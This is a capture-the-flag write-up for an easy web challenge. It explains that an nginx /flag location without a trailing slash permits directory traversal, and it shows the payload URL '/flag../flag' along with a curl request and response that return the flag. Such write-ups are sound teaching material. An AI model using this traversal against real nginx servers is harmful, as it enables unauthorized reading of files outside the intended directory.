# Stage 3: travel - web - easy

## Challenge

Fun climbing up: http://108.61.211.185:8081/

## Solution

The nginx configuration showed in the root of the given server has some strange
configuration of the /flag location. See nginx.conf for the full configuration.

The location does not end with a "/", so it is vulnerable to directory traversal.
With this knowledge, are able to read files outside of the directory. To do this,
the following URL is used:

```
http://108.61.211.185:8081/flag../flag
```

This URL will open the flag file, regarding of the location configuration in
nginx. This will show the flag:

```
root@blackbox: # curl -v http://108.61.211.185:8081/flag../flag
*   Trying 108.61.211.185...
* TCP_NODELAY set
* Connected to 108.61.211.185 (108.61.211.185) port 8081 (#0)
> GET /flag../flag HTTP/1.1
> Host: 108.61.211.185:8081
> User-Agent: curl/7.62.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sun, 29 Dec 2019 12:10:48 GMT
< Content-Type: text/plain
< Content-Length: 23
< Last-Modified: Fri, 27 Dec 2019 15:42:14 GMT
< Connection: keep-alive
< ETag: "5e062656-17"
< Accept-Ranges: bytes
<
junior-the_easy_way_up
```
